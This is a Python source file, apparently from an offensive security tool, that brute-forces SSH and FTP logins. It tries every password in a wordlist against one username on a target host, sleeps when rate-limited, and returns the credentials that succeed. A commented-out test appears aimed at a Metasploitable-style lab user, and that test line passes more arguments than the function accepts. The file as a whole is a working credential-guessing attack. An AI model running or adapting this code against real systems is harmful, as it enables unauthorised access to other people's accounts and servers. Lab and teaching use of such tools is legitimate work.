# SSH
import paramiko

# FTP
import ftplib

import socket
import time
import os
from colors import info, warning

# Get python file dir path
FILE_DIR = os.path.dirname(os.path.realpath(__file__)) + '/'

def ssh_connect(client, target, ssh_port, username, password, verbose):
    
    if verbose:
        info(f'Trying {username}:{password}...')

    try:
        client.connect(hostname=target, port=ssh_port, username=username, password=password, timeout=2)
    except paramiko.AuthenticationException:
        # Common error as long as we are bruteforcing, so log is optional
        if verbose:
            warning(f"Failed for {username}:{password}")
        return False
    except paramiko.SSHException:
        # SSHException is a generic error, in this context it must means that we tried to many login in a short time window
        warning(f"Maybe too much attempts. Waiting 30 seconds...")
        time.sleep(30)
    else:
        # success
        info(f'''Found one !
        USERNAME: {username}
        PASSWORD: {password}''')
        return True

def ftp_connect(client, target, port, username, password, verbose):

    info(f"Trying {username}:{password}...")
    try:
        # Login attempt using provided credentials, 
        client.connect(target, port, timeout=2)
        client.login(username, password)

    except socket.timeout:
        if verbose:
            warning('No answer from FTP server. Maybe wrong credentials or server is blocking new connection.')
    except ftplib.error_perm:
        # Login failed
        if verbose:
            warning('Connection failed, wrong credentials')

        return False
    else:
        # true credentials
        info(f'''Found one ! : 
        USERNAME: {username}
        PASSWORD: {password}''')
        return True

def bruteforce(services, target, username, verbose, passlist='wordlist.txt'):
    
    # Read each line of password list
    passlist = open(FILE_DIR + passlist).read().splitlines()
    
    credentials = list()

    for service in services:
        service_name = service[0]
        service_port = int(service[1])

        info(f'Bruteforcing {service_name}')
        # FTP client
        if service_name == 'ftp':
            ftp_client = ftplib.FTP()
            ftp_port = service_port
        else:
            ftp_client = False

        # SSH client
        if service_name == 'ssh':
            ssh_client = paramiko.SSHClient()
            ssh_port = service_port

            # Pass host key verification by adding it to known hosts
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        else:
            ssh_client = False

        for password in passlist:
            # Add login/password to credentials list for each combination that *_connect functions returns True value.
            if ssh_client:
                if ssh_connect(ssh_client, target, ssh_port, username, password, verbose):
                    credentials.append(f"ssh : {username}:{password}@{target}:{service_port}")

            if ftp_client:
                if ftp_connect(ftp_client, target, ftp_port, username, password, verbose):
                    credentials.append(f"ftp : {username}:{password}@{target}:{service_port}")
    return credentials
        
# # Testing
# verbose = True
# services = [['ssh', '22'],['ftp','21']]
# print(bruteforce(services, '172.16.80.128', 'msfadmin', verbose, 22, 'pass.txt'))
###########